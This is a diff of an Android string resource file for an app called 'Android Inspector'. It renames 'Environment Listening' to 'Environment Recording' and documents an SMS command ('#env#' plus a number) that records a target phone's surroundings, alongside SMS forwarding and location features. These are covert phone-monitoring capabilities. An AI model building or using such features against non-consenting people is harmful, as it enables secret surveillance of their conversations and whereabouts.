@@ -76,7 +76,7 @@
     <string name="pref_category_gps_key">pref_category_gps</string>
     <string name="pref_category_gps_title">Phone Location</string>
     <string name="pref_category_ring_title">Force Belling</string>
-    <string name="pref_category_env_title">Environment Listening</string>
+    <string name="pref_category_env_rec_title">Environment Recording</string>
     
     <string name="pref_sender_mail_title">Mail Sender(GMail/QQ ONLY)</string>
     <string name="pref_sender_mail_summary">Only GMail and QQ mail are supported.</string>
@@ -112,8 +112,8 @@
     <string name="pref_forward_all_sms_limit_in_trial">Only 5 times SMS forwarding permitted in trial.</string>
     <string name="pref_ring_word_title">Force Belling</string>
     <string name="pref_ring_word_summary">Send SMS #bell to force belling.</string>
-    <string name="pref_env_word_title">Environment Listening</string>
-    <string name="pref_env_word_summary">Send SMS #env to listen to target phone environment.</string>
+    <string name="pref_env_rec_word_title">Environment Recording</string>
+    <string name="pref_env_rec_word_summary">Send SMS #env# plus number(1~30) to record target phone environment.</string>
     
     <!-- InitActivity -->
     <string name="init_title">Android Inspector</string>
